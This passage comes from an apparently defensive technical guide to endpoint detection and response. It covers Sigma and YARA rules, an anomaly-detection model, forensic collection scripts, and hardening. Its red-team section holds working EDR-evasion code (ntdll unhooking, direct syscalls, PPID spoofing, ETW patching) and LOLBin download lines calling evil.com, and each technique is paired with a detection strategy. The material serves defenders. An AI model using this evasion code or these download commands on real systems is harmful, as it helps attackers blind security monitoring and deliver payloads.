  - attack.t1059.001
  - attack.defense_evasion
  - attack.t1027
logsource:
  category: process_creation
  product: windows
detection:
  selection_encoded:
    Image|endswith:
      - '\powershell.exe'
      - '\pwsh.exe'
    CommandLine|contains:
      - '-enc'
      - '-EncodedCommand'
      - '-e '
      - '-ec '
  selection_base64_pattern:
    CommandLine|re: '[A-Za-z0-9+/=]{50,}'
  filter_legitimate:
    ParentImage|endswith:
      - '\sccm\ccmexec.exe'
      - '\Microsoft Monitoring Agent\'
    User: 'NT AUTHORITY\SYSTEM'
  condition: (selection_encoded or selection_base64_pattern) and not filter_legitimate
falsepositives:
  - Legitimate automation scripts using encoded commands
  - SCCM deployments
  - Some monitoring agents
```

### 4.4 YARA Rules for Memory Scanning

```yara
rule CobaltStrike_Beacon_Config {
    meta:
        description = "Detects Cobalt Strike Beacon configuration in memory"
        author = "Detection Engineering"
        date = "2025-02-10"
        mitre = "T1071.001"
        severity = "critical"
    
    strings:
        // Beacon config magic bytes
        $config_header = { 00 01 00 01 00 02 ?? ?? 00 02 00 01 00 02 ?? ?? }
        
        // Sleep mask patterns
        $sleep_mask_x64 = { 4C 8B 53 08 45 8B 0A 45 8B 5A 04 4D 8D 52 08 45 85 C9 }
        
        // Named pipe patterns
        $pipe1 = "\\\\.\\pipe\\MSSE-" ascii
        $pipe2 = "\\\\.\\pipe\\postex_" ascii
        $pipe3 = "\\\\.\\pipe\\status_" ascii
        
        // HTTP beacon indicators
        $http_get = "/api/v1/" ascii
        $http_post = "Content-Type: application/octet-stream" ascii
        
        // Reflective loader
        $reflective = { 41 51 41 50 52 51 56 48 31 D2 65 48 8B 52 60 }
        
    condition:
        $config_header or
        ($sleep_mask_x64 and any of ($pipe*)) or
        ($reflective and any of ($http*))
}

rule Mimikatz_Memory_Indicators {
    meta:
        description = "Detects Mimikatz patterns in process memory"
        author = "Detection Engineering"
        date = "2025-01-20"
        mitre = "T1003.001"
        severity = "critical"
    
    strings:
        $s1 = "sekurlsa::logonpasswords" ascii wide
        $s2 = "sekurlsa::wdigest" ascii wide
        $s3 = "kerberos::golden" ascii wide
        $s4 = "lsadump::dcsync" ascii wide
        $s5 = "privilege::debug" ascii wide
        
        // Mimikatz binary signatures (even when renamed)
        $bin1 = { 44 3A 5C 61 5C 6D }  // "D:\a\m" (build path remnant)
        $bin2 = "gentilkiwi" ascii wide
        $bin3 = "Benjamin DELPY" ascii wide
        
        // Function patterns unique to mimikatz
        $func1 = { 48 8B 05 ?? ?? ?? ?? 48 85 C0 74 ?? 48 8B 48 08 E8 }
        
    condition:
        2 of ($s*) or
        any of ($bin*) or
        ($func1 and 1 of ($s*))
}

rule Reflective_DLL_Injection {
    meta:
        description = "Detects reflective DLL loading patterns in memory"
        author = "Detection Engineering"
        date = "2025-03-01"
        mitre = "T1620"
        severity = "high"
    
    strings:
        // PE header in non-standard memory location
        $mz = "MZ"
        $pe = "PE\x00\x00"
        
        // ReflectiveLoader function patterns
        $loader1 = { 55 8B EC 83 EC ?? 53 56 57 8B ?? E8 00 00 00 00 5B }
        $loader2 = { 4D 5A 41 52 55 48 89 E5 48 81 EC ?? ?? 00 00 }
        
        // VirtualAlloc + memcpy pattern
        $alloc = { FF 15 ?? ?? ?? ?? 48 89 C7 48 89 F9 4C 89 }
        
    condition:
        $mz at 0 and $pe in (0..1024) and
        (any of ($loader*) or $alloc)
}
```

### 4.5 Machine Learning Model Training for Anomaly Detection

**Feature Engineering for Process Behavior:**

```python
import pandas as pd
import numpy as np
from sklearn.ensemble import IsolationForest
from sklearn.preprocessing import StandardScaler

class ProcessBehaviorModel:
    """
    Anomaly detection model for process execution patterns.
    Features engineered from EDR telemetry to detect deviations
    from baseline endpoint behavior.
    """
    
    FEATURE_COLUMNS = [
        'child_process_count',          # Number of child processes spawned
        'network_connections_count',     # Outbound connections initiated
        'file_writes_count',            # File write operations
        'registry_modifications_count', # Registry changes made
        'unique_dlls_loaded',           # Distinct DLLs loaded
        'unsigned_dll_ratio',           # Ratio of unsigned to total DLLs
        'command_line_entropy',         # Shannon entropy of command line
        'command_line_length',          # Raw length of command line
        'execution_duration_seconds',   # How long process ran
        'memory_peak_mb',              # Peak memory usage
        'parent_child_path_mismatch',  # 1 if parent/child in different dirs
        'is_lolbin',                   # 1 if process is a known LOLBin
        'network_dest_entropy',        # Entropy of destination IPs
        'time_of_day_hour',            # Hour of execution (0-23)
        'day_of_week',                 # Day of week (0-6)
    ]
    
    def __init__(self, contamination: float = 0.01):
        self.model = IsolationForest(
            n_estimators=200,
            contamination=contamination,
            max_samples='auto',
            random_state=42,
            n_jobs=-1
        )
        self.scaler = StandardScaler()
        self.baseline_stats = {}
    
    def extract_features(self, telemetry_df: pd.DataFrame) -> pd.DataFrame:
        """Extract behavioral features from raw EDR telemetry."""
        features = pd.DataFrame()
        
        # Group by process execution instance
        grouped = telemetry_df.groupby('process_guid')
        
        features['child_process_count'] = grouped['child_processes'].sum()
        features['network_connections_count'] = grouped['network_events'].sum()
        features['file_writes_count'] = grouped['file_writes'].sum()
        features['registry_modifications_count'] = grouped['reg_mods'].sum()
        features['unique_dlls_loaded'] = grouped['dll_loads'].nunique()
        
        # Calculate entropy of command lines
        features['command_line_entropy'] = telemetry_df.groupby('process_guid')[
            'command_line'].first().apply(self._shannon_entropy)
        
        features['command_line_length'] = telemetry_df.groupby('process_guid')[
            'command_line'].first().str.len()
        
        # Unsigned DLL ratio
        dll_stats = telemetry_df[telemetry_df['event_type'] == 'image_load']
        features['unsigned_dll_ratio'] = (
            dll_stats.groupby('process_guid')['is_signed'].apply(
                lambda x: 1 - x.mean() if len(x) > 0 else 0
            )
        )
        
        return features[self.FEATURE_COLUMNS].fillna(0)
    
    def train(self, baseline_telemetry: pd.DataFrame):
        """Train on known-good baseline telemetry."""
        features = self.extract_features(baseline_telemetry)
        scaled = self.scaler.fit_transform(features)
        self.model.fit(scaled)
        
        # Store baseline statistics for explainability
        self.baseline_stats = {
            col: {
                'mean': features[col].mean(),
                'std': features[col].std(),
                'p95': features[col].quantile(0.95),
                'p99': features[col].quantile(0.99)
            }
            for col in self.FEATURE_COLUMNS
        }
    
    def predict(self, telemetry_df: pd.DataFrame) -> pd.DataFrame:
        """Score new telemetry for anomalies. Returns -1 for anomalies."""
        features = self.extract_features(telemetry_df)
        scaled = self.scaler.transform(features)
        
        scores = self.model.decision_function(scaled)
        predictions = self.model.predict(scaled)
        
        results = features.copy()
        results['anomaly_score'] = scores
        results['is_anomaly'] = predictions == -1
        results['contributing_features'] = results.apply(
            self._explain_anomaly, axis=1
        )
        
        return results[results['is_anomaly']]
    
    @staticmethod
    def _shannon_entropy(text: str) -> float:
        """Calculate Shannon entropy of a string."""
        if not text:
            return 0.0
        prob = [float(text.count(c)) / len(text) for c in set(text)]
        return -sum(p * np.log2(p) for p in prob if p > 0)
    
    def _explain_anomaly(self, row: pd.Series) -> list:
        """Identify which features contributed most to anomaly score."""
        explanations = []
        for col in self.FEATURE_COLUMNS:
            if col in self.baseline_stats:
                stats = self.baseline_stats[col]
                if row[col] > stats['p99']:
                    explanations.append(
                        f"{col}: {row[col]:.2f} (baseline p99: {stats['p99']:.2f})"
                    )
        return explanations
```

---

## 5. Risposta agli Incidenti via EDR

### 5.1 Remote Isolation

EDR network isolation is the first response action during an active breach. The mechanism varies by platform:

**CrowdStrike Falcon:**
```
# Via API
POST /devices/entities/devices-actions/v2
Body: {"action_name": "contain", "ids": ["device_id_here"]}
```

**Microsoft Defender for Endpoint:**
```powershell
# Isolate machine via MDE API
$headers = @{
    "Authorization" = "Bearer $token"
    "Content-Type" = "application/json"
}
$body = @{
    Comment = "Isolating due to active C2 communication detected"
    IsolationType = "Full"  # or "Selective" (allows Outlook/Teams)
} | ConvertTo-Json

Invoke-RestMethod -Uri "https://api.securitycenter.microsoft.com/api/machines/$machineId/isolate" `
    -Method POST -Headers $headers -Body $body
```

**Isolation mechanics:**

The EDR driver modifies Windows Filtering Platform (WFP) rules at the kernel level to block all network traffic except communication back to the EDR cloud. This prevents:
- Lateral movement from the compromised host
- Data exfiltration continuation
- C2 communication
- Adversary awareness of detection (if they lose network access to C2)

While allowing:
- EDR agent communication (for remote investigation)
- DNS resolution to EDR infrastructure
- Optionally: selective services (email for business continuity)

### 5.2 Live Response / Remote Shell

All major EDR platforms provide remote shell access for forensic investigation:

**Common live response capabilities:**

```powershell
# CrowdStrike Real Time Response (RTR) commands
runscript -CloudFile="CollectForensicArtifacts"
get "C:\Windows\System32\config\SAM"
memdump  # Full memory acquisition
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
netstat -ano
ps       # Process listing with full details

# MDE Live Response
getfile "C:\Users\compromised\AppData\Local\Temp\payload.exe"
run forensic_collection.ps1
remediate file "C:\Windows\Temp\malware.dll"
```

**Automated forensic collection script for live response:**

```powershell
# collect_forensics.ps1 — Run via EDR Live Response
# Collects volatile and non-volatile forensic artifacts

param(
    [string]$OutputPath = "C:\ForensicCollection",
    [string]$CaseID = (Get-Date -Format "yyyyMMdd_HHmmss")
)

$CollectionPath = Join-Path $OutputPath $CaseID
New-Item -ItemType Directory -Path $CollectionPath -Force | Out-Null

# --- Volatile Data (collect first) ---

# Running processes with full details
Get-Process | Select-Object Id, ProcessName, Path, StartTime, 
    @{N='CommandLine';E={(Get-CimInstance Win32_Process -Filter "ProcessId=$($_.Id)").CommandLine}},
    @{N='ParentPID';E={(Get-CimInstance Win32_Process -Filter "ProcessId=$($_.Id)").ParentProcessId}} |
    Export-Csv "$CollectionPath\processes.csv" -NoTypeInformation

# Network connections
Get-NetTCPConnection | Where-Object { $_.State -ne 'Bound' } |
    Select-Object LocalAddress, LocalPort, RemoteAddress, RemotePort, State, OwningProcess,
    @{N='ProcessName';E={(Get-Process -Id $_.OwningProcess -ErrorAction SilentlyContinue).ProcessName}} |
    Export-Csv "$CollectionPath\network_connections.csv" -NoTypeInformation

# DNS cache
Get-DnsClientCache | Export-Csv "$CollectionPath\dns_cache.csv" -NoTypeInformation

# Loaded DLLs for suspicious processes
Get-Process | ForEach-Object {
    $proc = $_
    try {
        $_.Modules | Select-Object @{N='ProcessName';E={$proc.ProcessName}},
            @{N='PID';E={$proc.Id}}, ModuleName, FileName, Size |
            Where-Object { $_.FileName -notlike "C:\Windows\*" }
    } catch {}
} | Export-Csv "$CollectionPath\suspicious_modules.csv" -NoTypeInformation

# --- Persistence Mechanisms ---

# Scheduled tasks
Get-ScheduledTask | Where-Object { $_.State -ne 'Disabled' } |
    Select-Object TaskName, TaskPath, State,
    @{N='Actions';E={($_.Actions | ForEach-Object { $_.Execute + " " + $_.Arguments }) -join "; "}} |
    Export-Csv "$CollectionPath\scheduled_tasks.csv" -NoTypeInformation

# Run keys
$runKeys = @(
    "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run",
    "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce",
    "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run",
    "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce",
    "HKLM:\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Run"
)
$runKeys | ForEach-Object {
    if (Test-Path $_) {
        Get-ItemProperty $_ | Select-Object PSPath, * -ExcludeProperty PS*
    }
} | Export-Csv "$CollectionPath\run_keys.csv" -NoTypeInformation

# Services (focus on non-Microsoft)
Get-CimInstance Win32_Service | Where-Object {
    $_.PathName -notlike "*\Windows\*" -and $_.PathName -ne $null
} | Select-Object Name, DisplayName, State, StartMode, PathName |
    Export-Csv "$CollectionPath\suspicious_services.csv" -NoTypeInformation

# --- Event Logs ---

# Security log - authentication events
Get-WinEvent -FilterHashtable @{LogName='Security'; Id=4624,4625,4648,4672} -MaxEvents 1000 |
    Select-Object TimeCreated, Id, Message |
    Export-Csv "$CollectionPath\auth_events.csv" -NoTypeInformation

# PowerShell script block logs
Get-WinEvent -FilterHashtable @{LogName='Microsoft-Windows-PowerShell/Operational'; Id=4104} -MaxEvents 500 |
    Select-Object TimeCreated, @{N='ScriptBlock';E={$_.Properties[2].Value}} |
    Export-Csv "$CollectionPath\powershell_scriptblocks.csv" -NoTypeInformation

# --- File System Artifacts ---

# Recently modified executables in user directories
Get-ChildItem -Path "C:\Users" -Recurse -Include *.exe,*.dll,*.ps1,*.bat,*.vbs,*.js -ErrorAction SilentlyContinue |
    Where-Object { $_.LastWriteTime -gt (Get-Date).AddDays(-7) } |
    Select-Object FullName, Length, CreationTime, LastWriteTime,
    @{N='SHA256';E={(Get-FileHash $_.FullName -Algorithm SHA256).Hash}} |
    Export-Csv "$CollectionPath\recent_executables.csv" -NoTypeInformation

# Prefetch files (execution evidence)
Get-ChildItem "C:\Windows\Prefetch\*.pf" -ErrorAction SilentlyContinue |
    Select-Object Name, CreationTime, LastWriteTime |
    Export-Csv "$CollectionPath\prefetch.csv" -NoTypeInformation

Write-Output "[+] Collection complete: $CollectionPath"
Write-Output "[+] Files collected: $((Get-ChildItem $CollectionPath).Count)"
```

### 5.3 Memory Dump Collection

```powershell
# Targeted process memory dump via EDR live response
# Safer than full memory dump for specific process investigation

function Invoke-ProcessMemoryDump {
    param(
        [Parameter(Mandatory)][int]$ProcessId,
        [string]$OutputPath = "C:\ForensicCollection\MemoryDumps"
    )
    
    New-Item -ItemType Directory -Path $OutputPath -Force | Out-Null
    $dumpFile = Join-Path $OutputPath "${ProcessId}_$(Get-Date -Format 'yyyyMMddHHmmss').dmp"
    
    # Use comsvcs.dll MiniDump (available on all Windows systems)
    # Full memory dump type = 0x00000002 (MiniDumpWithFullMemory)
    rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump $ProcessId $dumpFile full
    
    if (Test-Path $dumpFile) {
        $hash = (Get-FileHash $dumpFile -Algorithm SHA256).Hash
        Write-Output "[+] Dump created: $dumpFile (SHA256: $hash)"
    }
}
```

### 5.4 Automated Response Actions

EDR platforms support rule-based automated responses:

```yaml
# Automated response playbook example
playbook:
  name: "Ransomware Containment"
  trigger:
    conditions:
      - event: file_modify
        pattern: "entropy > 7.5 AND extension_changed = true"
        threshold: 10  # files in 60 seconds
        timewindow: 60s
  
  actions:
    - action: isolate_endpoint
      priority: immediate
      comment: "Auto-isolated: Ransomware behavior detected"
    
    - action: kill_process_tree
      target: triggering_process
      comment: "Terminated encryption process tree"
    
    - action: collect_memory_dump
      target: triggering_process
    
    - action: snapshot_disk
      comment: "Capture disk state before further damage"
    
    - action: notify
      channel: soc_critical
      message: "RANSOMWARE DETECTED on {hostname} - Auto-contained"
      include: [process_tree, file_modifications, network_connections]
    
    - action: create_ticket
      severity: P1
      assignee: incident_response_team
```

### 5.5 Kill Chain Interruption

EDR enables interruption at multiple points in the attack lifecycle:

| Kill Chain Phase | EDR Capability | Response Action |
|-----------------|---------------|-----------------|
| Delivery | Email/download monitoring | Block file, quarantine |
| Exploitation | Behavioral detection of exploit patterns | Kill process, alert |
| Installation | File creation monitoring, persistence detection | Delete artifact, remove persistence |
| C2 | Network telemetry, DNS monitoring | Isolate host, block IP/domain |
| Actions on Objectives | Data access patterns, exfiltration detection | Isolate, collect evidence |

---

## 6. EDR Bypass Techniques — Red Team Perspective

> **Nota importante**: This section documents bypass techniques from a defensive perspective. Understanding how adversaries evade EDR is essential for hardening deployments, tuning detection rules, and validating EDR efficacy through purple team exercises. All techniques are presented with corresponding detection strategies.

### 6.1 Userland Unhooking

**Concept**: EDR agents hook ntdll.dll functions in user-mode processes by overwriting the first bytes of NT API functions with a JMP instruction that redirects execution to the EDR's inspection code. Unhooking restores the original bytes.

**Technique — Fresh Copy Restoration:**

```c
// Conceptual: Load a fresh copy of ntdll.dll from disk to bypass hooks
// Detection: Monitor for secondary ntdll.dll loads, file reads of ntdll.dll

HANDLE hFile = CreateFileA("C:\\Windows\\System32\\ntdll.dll", 
    GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
HANDLE hMapping = CreateFileMapping(hFile, NULL, PAGE_READONLY, 0, 0, NULL);
LPVOID freshNtdll = MapViewOfFile(hMapping, FILE_MAP_READ, 0, 0, 0);

// Get the .text section of the fresh copy
PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)freshNtdll;
PIMAGE_NT_HEADERS ntHeaders = (PIMAGE_NT_HEADERS)((BYTE*)freshNtdll + dosHeader->e_lfanew);
PIMAGE_SECTION_HEADER textSection = IMAGE_FIRST_SECTION(ntHeaders);

// Overwrite hooked .text section with clean copy
LPVOID localNtdll = GetModuleHandleA("ntdll.dll");
DWORD oldProtect;
VirtualProtect((BYTE*)localNtdll + textSection->VirtualAddress, 
    textSection->Misc.VirtualSize, PAGE_EXECUTE_READWRITE, &oldProtect);
memcpy((BYTE*)localNtdll + textSection->VirtualAddress,
    (BYTE*)freshNtdll + textSection->VirtualAddress,
    textSection->Misc.VirtualSize);
VirtualProtect((BYTE*)localNtdll + textSection->VirtualAddress,
    textSection->Misc.VirtualSize, oldProtect, &oldProtect);
```

**Detection strategy:**
- Monitor for `CreateFile` on `ntdll.dll` from non-system processes
- Track `MapViewOfFile` operations on system DLLs
- Monitor for `VirtualProtect` calls changing `.text` section permissions
- Kernel-level syscall monitoring (unaffected by userland unhooking)

### 6.2 Direct Syscalls

**Concept**: Instead of calling NT API functions through ntdll.dll (where EDR hooks reside), directly invoke the syscall instruction with the correct syscall number, completely bypassing the userland hook chain.

```asm
; Direct syscall for NtAllocateVirtualMemory (syscall number varies by Windows build)
; Windows 10 21H2: 0x0018
; Windows 11 22H2: 0x0018

NtAllocateVirtualMemory PROC
    mov r10, rcx              ; First argument to r10 (Windows syscall convention)
    mov eax, 18h             ; Syscall number for NtAllocateVirtualMemory
    syscall                   ; Direct kernel transition
    ret
NtAllocateVirtualMemory ENDP

; Indirect syscall variant (harder to detect):
; Instead of executing syscall directly, JMP to the syscall instruction
; inside ntdll.dll's legitimate code — avoids syscall-from-non-ntdll detection
```

**Detection strategy:**
- Monitor for `syscall` instructions executing from memory outside ntdll.dll address space
- Stack frame analysis: legitimate calls have ntdll frames; direct syscalls do not
- Windows 11+ feature: Kernel-mode telemetry for syscall origin validation
- ETW providers: `Microsoft-Windows-Threat-Intelligence` captures direct syscall usage on newer Windows

### 6.3 PPID Spoofing

**Concept**: Create processes with a spoofed parent PID to break process genealogy analysis. EDR relies on parent-child relationships for behavioral detection.

```c
// CreateProcess with spoofed parent via PROC_THREAD_ATTRIBUTE_PARENT_PROCESS
STARTUPINFOEXA si = { sizeof(si) };
PROCESS_INFORMATION pi;
SIZE_T attributeSize;

InitializeProcThreadAttributeList(NULL, 1, 0, &attributeSize);
si.lpAttributeList = (LPPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(GetProcessHeap(), 0, attributeSize);
InitializeProcThreadAttributeList(si.lpAttributeList, 1, 0, &attributeSize);

// Open a legitimate parent (e.g., explorer.exe)
HANDLE hParent = OpenProcess(PROCESS_ALL_ACCESS, FALSE, explorerPid);

UpdateProcThreadAttribute(si.lpAttributeList, 0, 
    PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, &hParent, sizeof(HANDLE), NULL, NULL);

CreateProcessA(NULL, "cmd.exe /c whoami", NULL, NULL, FALSE,
    EXTENDED_STARTUPINFO_PRESENT | CREATE_NO_WINDOW,
    NULL, NULL, &si.StartupInfo, &pi);
```

**Detection strategy:**
- Compare `CreatingProcess` (real creator, available in kernel callbacks) with `ParentProcess` (reported via attributes)
- Sysmon Event ID 1 includes both `ParentProcessId` and the real parent via kernel callback
- Alert when a process's parent PID does not match the actual calling process
- Monitor for `PROC_THREAD_ATTRIBUTE_PARENT_PROCESS` usage in `UpdateProcThreadAttribute` calls

### 6.4 Timestamp Stomping

**Concept**: Modify file timestamps (creation, modification, access) to blend malicious files with legitimate system files, evading timeline analysis.

**Detection via Sysmon:**
- Event ID 2 (`FileCreateTime` changed) explicitly logs timestamp modifications
- Compare `$STANDARD_INFORMATION` timestamps with `$FILE_NAME` timestamps in NTFS (the latter cannot be modified from user mode without raw disk access)

```yaml
# Sigma rule for timestamp stomping detection
title: File Creation Time Modification (Timestamp Stomping)
logsource:
  product: windows
  category: file_change
detection:
  selection:
    EventID: 2
  filter_legitimate:
    Image|endswith:
      - '\msiexec.exe'
      - '\TiWorker.exe'
      - '\setup.exe'
  condition: selection and not filter_legitimate
```

### 6.5 ETW Patching

**Concept**: EDR agents consume ETW events. Patching the ETW logging function (`EtwEventWrite` or `NtTraceEvent`) in the target process prevents telemetry generation.

```c
// Patch EtwEventWrite to return immediately (RET = 0xC3)
// This blinds any ETW consumer (including EDR) for events from this process

void PatchETW() {
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    FARPROC pEtwEventWrite = GetProcAddress(hNtdll, "EtwEventWrite");
    
    DWORD oldProtect;
    VirtualProtect(pEtwEventWrite, 1, PAGE_EXECUTE_READWRITE, &oldProtect);
    
    // Overwrite first byte with RET instruction
    *(BYTE*)pEtwEventWrite = 0xC3;  // ret
    
    VirtualProtect(pEtwEventWrite, 1, oldProtect, &oldProtect);
}
```

**Detection strategy:**
- Monitor for `VirtualProtect` on ntdll.dll memory regions
- Integrity checking of ETW functions periodically from kernel-mode
- Kernel-mode ETW consumers are NOT affected by userland patching
- Monitor for processes that suddenly stop generating expected ETW events (behavioral gap detection)

### 6.6 AMSI Bypass

**Concept**: The Antimalware Scan Interface provides EDR/AV visibility into script content at deobfuscation time. Bypassing AMSI blinds the EDR to PowerShell, VBScript, JScript, and .NET content.

```powershell
# Conceptual AMSI bypass — patch AmsiScanBuffer to always return clean
# The actual implementation patches the function in memory to return S_OK (no threat)

# Detection: Monitor for modifications to amsi.dll memory
# ETW provider Microsoft-Windows-AMSI logs bypass attempts
# Sysmon ImageLoad event for amsi.dll + subsequent VirtualProtect calls
```

**Detection strategy:**
- ETW provider `{2A576B87-09A7-520E-C21A-4942F0271D67}` (Microsoft-Windows-AMSI) logs scan failures
- Monitor for `VirtualProtect` on amsi.dll memory regions
- Script Block Logging (PowerShell Event ID 4104) captures content BEFORE AMSI scanning
- Behavioral: PowerShell process that suddenly stops triggering AMSI events

### 6.7 Reflective DLL Loading

**Concept**: Load a DLL entirely from memory without touching disk, avoiding file-based detection and standard DLL load monitoring.

**Detection strategy:**
- Monitor for `RWX` memory allocations (`VirtualAlloc` with `PAGE_EXECUTE_READWRITE`)
- Unbacked executable memory (memory regions with no corresponding file on disk)
- PE header signatures (MZ/PE) in non-image memory allocations
- Sysmon Event ID 7 (Image Loaded) will NOT fire for reflective loads — the absence of a load event for a DLL that's clearly executing is itself an indicator
- Memory scanning for PE headers in heap/stack regions

### 6.8 Process Injection Variants

**Classic injection methods and their telemetry signatures:**

| Technique | API Pattern | Sysmon Detection |
|-----------|------------|------------------|
| CreateRemoteThread | OpenProcess → VirtualAllocEx → WriteProcessMemory → CreateRemoteThread | Event 8 (CreateRemoteThread) |
| QueueUserAPC | OpenProcess → VirtualAllocEx → WriteProcessMemory → QueueUserAPC | Event 10 (ProcessAccess) with specific access masks |
| NtMapViewOfSection | NtCreateSection → NtMapViewOfSection (local) → NtMapViewOfSection (remote) → NtCreateThreadEx | No direct Sysmon event — requires ETW |
| Process Hollowing | CreateProcess (SUSPENDED) → NtUnmapViewOfSection → WriteProcessMemory → SetThreadContext → ResumeThread | Event 25 (ProcessTampering) |
| Thread Hijacking | OpenThread → SuspendThread → SetThreadContext → ResumeThread | Event 10 (ProcessAccess) targeting thread |
| Module Stomping | Load legitimate DLL → Overwrite .text section with payload | Image load followed by unexpected behavior |

### 6.9 Living-off-the-Land (LOLBins)

Adversaries abuse legitimate Windows binaries to proxy execution:

```
# Common LOLBin abuse patterns and detection

# certutil.exe — download files
certutil -urlcache -split -f http://evil.com/payload.exe C:\temp\payload.exe
# Detection: certutil with -urlcache and external URL

# mshta.exe — execute HTA/VBS
mshta vbscript:Execute("CreateObject(...)")
# Detection: mshta with inline script or external URL

# regsvr32.exe — scriptlet execution (Squiblydoo)
regsvr32 /s /n /u /i:http://evil.com/file.sct scrobj.dll
# Detection: regsvr32 with /i: parameter pointing to external resource

# wmic.exe — process creation
wmic process call create "cmd.exe /c whoami"
# Detection: wmic with process call create

# msbuild.exe — inline task execution
msbuild.exe malicious.csproj
# Detection: msbuild executing from non-standard directory or without solution context
```

**Sigma rule for LOLBin network connections:**

```yaml
title: LOLBin Network Connection
id: 2a3b9c7e-8f41-4d12-b3c5-6e7a8d9f0123
level: high
logsource:
  category: network_connection
  product: windows
detection:
  selection:
    Image|endswith:
      - '\certutil.exe'
      - '\mshta.exe'
      - '\regsvr32.exe'
      - '\rundll32.exe'
      - '\wscript.exe'
      - '\cscript.exe'
      - '\msbuild.exe'
      - '\installutil.exe'
      - '\regasm.exe'
    Initiated: 'true'
  filter_internal:
    DestinationIp|startswith:
      - '10.'
      - '172.16.'
      - '192.168.'
      - '127.'
  condition: selection and not filter_internal
```

### 6.10 Kernel Callback Manipulation

**Concept**: Advanced adversaries with kernel access (admin + driver loading capability) can remove EDR's kernel notification callbacks, completely blinding the agent.

**Mechanism**: The kernel maintains arrays of registered callbacks (for process creation, image loads, registry operations, etc.). An attacker with kernel code execution can enumerate these arrays and zero out EDR callback entries.

```c
// Conceptual — requires kernel driver
// Enumerate PsSetCreateProcessNotifyRoutineEx callbacks

// The PspCreateProcessNotifyRoutine array holds up to 64 callback entries
// Each entry is an EX_CALLBACK_ROUTINE_BLOCK structure
// Zeroing the callback function pointer removes the notification

// Detection: Monitor driver loads, kernel integrity checks
// Windows Driver Signature Enforcement blocks unsigned drivers
// Kernel Patch Protection (PatchGuard) detects some modifications
// Some EDR agents verify their own callback registration periodically
```

**Detection and prevention:**
- Hypervisor-Protected Code Integrity (HVCI) prevents unauthorized kernel code
- Driver Signature Enforcement requires signed drivers
- PatchGuard detects modification of system structures (though it can be bypassed)
- EDR self-protection: periodic verification of callback registration status
- Secure Boot chain prevents loading of unauthorized boot-start drivers

---

## 7. Hardening EDR Deployments

### 7.1 Tamper Protection

EDR tamper protection prevents adversaries from disabling or uninstalling the security agent:

**Layers of protection:**

1. **Service protection**: EDR service runs as Protected Process Light (PPL), preventing termination even by administrators
2. **Driver protection**: Kernel-mode components are Early Launch Anti-Malware (ELAM) drivers, loading before third-party code
3. **File protection**: Self-Protection Minifilter prevents deletion/modification of EDR files
4. **Registry protection**: Registry callbacks prevent modification of EDR configuration keys
5. **Uninstall protection**: Requires a token/password not stored locally

```powershell
# Verify MDE tamper protection status
Get-MpComputerStatus | Select-Object IsTamperProtected, RealTimeProtectionEnabled

# CrowdStrike sensor protection check
# REG QUERY "HKLM\SYSTEM\CrowdStrike\{9b03c1d9-3138-44ed-9fae-d9f4c034b88d}\{16e0423f-7058-48c9-a204-725362b67639}\Default" /v ProviderPlatform_1
```

### 7.2 Driver-Level Protections

```
┌────────────────────────────────────────────────────┐
│              BOOT SECURITY CHAIN                    │
│                                                     │
│  1. UEFI Secure Boot (firmware validation)          │
│     └─> 2. Bootloader (signed, measured)            │
│         └─> 3. Kernel (signature verified)          │
│             └─> 4. ELAM Driver (EDR early load)     │
│                 └─> 5. Boot-Start Drivers           │
│                     └─> 6. System-Start Drivers     │
│                         └─> 7. User-Mode Services   │
│                                                     │
│  ELAM loads BEFORE any third-party code             │
│  EDR has first-mover advantage in the boot chain   │
└────────────────────────────────────────────────────┘
```

### 7.3 Credential Guard Integration

Windows Credential Guard isolates LSASS secrets in a Hyper-V isolated container (VSM — Virtual Secure Mode). EDR integration:

- EDR monitors access attempts to the isolated LSASS
- Failed credential extraction attempts generate high-fidelity alerts
- Credential Guard + EDR = defense-in-depth against T1003.001

```powershell
# Enable Credential Guard via Group Policy or registry
# HKLM\SYSTEM\CurrentControlSet\Control\LSA
# LsaCfgFlags = 1 (with UEFI lock) or 2 (without UEFI lock)

# Verify Credential Guard is running
Get-CimInstance -ClassName Win32_DeviceGuard -Namespace root\Microsoft\Windows\DeviceGuard |
    Select-Object -Property SecurityServicesRunning, VirtualizationBasedSecurityStatus
```

### 7.4 Attack Surface Reduction (ASR) Rules

ASR rules complement EDR by blocking common attack vectors at the OS level:

```powershell
# Enable critical ASR rules via PowerShell
$rules = @{
    # Block Office applications from creating child processes
    "D4F940AB-401B-4EFC-AADC-AD5F3C50688A" = 1
    # Block Office from creating executable content
    "3B576869-A4EC-4529-8536-B80A7769E899" = 1
    # Block Office from injecting code into other processes
    "75668C1F-73B5-4CF0-BB93-3ECF5CB7CC84" = 1
    # Block JavaScript/VBScript from launching downloaded content
    "D3E037E1-3EB8-44C8-A917-57927947596D" = 1
    # Block execution of obfuscated scripts
    "5BEB7EFE-FD9A-4556-801D-275E5FFC04CC" = 1
    # Block credential stealing from LSASS
    "9E6C4E1F-7D60-472F-BA1A-A39EF669E4B2" = 1
    # Block process creations from WMI event subscriptions
    "E6DB77E5-3DF2-4CF1-B95A-636979351E5B" = 1
    # Block persistence through WMI event subscription
    "C1DB55AB-C21A-4637-BB3F-A12568109D35" = 1
    # Block untrusted/unsigned processes from USB
    "B2B3F03D-6A65-4F7B-A9C7-1C7EF74A9BA4" = 1
}

foreach ($rule in $rules.GetEnumerator()) {
    Set-MpPreference -AttackSurfaceReductionRules_Ids $rule.Key -AttackSurfaceReductionRules_Actions $rule.Value
}
```

### 7.5 Application Control Integration

Windows Defender Application Control (WDAC) or AppLocker combined with EDR:

```xml
<!-- WDAC policy snippet — allow only signed and trusted applications -->
<SiPolicy xmlns="urn:schemas-microsoft-com:sipolicy">
  <VersionEx>10.0.0.0</VersionEx>
  <PolicyTypeID>{A244370E-44C9-4C06-B551-F6016E563076}</PolicyTypeID>
